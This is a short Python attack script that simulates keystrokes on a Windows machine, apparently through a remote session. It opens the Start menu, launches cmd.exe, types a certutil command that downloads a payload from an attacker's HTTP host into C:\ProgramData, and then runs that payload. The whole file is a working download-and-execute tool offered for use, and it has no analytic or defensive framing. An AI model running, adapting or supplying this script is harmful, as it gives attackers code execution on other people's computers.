#!/usr/bin/python3

from pynput.keyboard import Controller, Key
import sys
import time

# Initialize the keyboard controller
keyboard = Controller()

# Command-line argument validation
if len(sys.argv) != 4:
    print(f"Usage: python {sys.argv[0]} <target-ip> <local-http-ip> <payload-name>")
    sys.exit(1)

_, rhost, lhost, payload = sys.argv

# Simulate key presses
def press_key(key):
    keyboard.press(key)
    keyboard.release(key)
    time.sleep(0.4)

# Simulate typing a string
def type_string(string):
    for char in string:
        keyboard.type(char)
        time.sleep(0.1)  # Small delay for realism

# Main function
def main():
    print("[+] Simulating keypresses")
    
    # Open Start Menu
    press_key(Key.cmd)
    print("[+] Opening Start Menu")
    time.sleep(1)
    
    # Open Command Prompt
    type_string("cmd.exe")
    press_key(Key.enter)
    print("[+] Opened CMD")
    time.sleep(1)
    
    # Download and execute the payload
    command = f"certutil.exe -f -urlcache http://{lhost}/{payload} C:\\ProgramData\\{payload}"
    type_string(command)
    press_key(Key.enter)
    print("[+] Downloaded payload")
    time.sleep(2)
    
    execute_command = f"C:\\ProgramData\\{payload}"
    type_string(execute_command)
    press_key(Key.enter)
    print("[+] Executed payload")

if __name__ == "__main__":
    main()
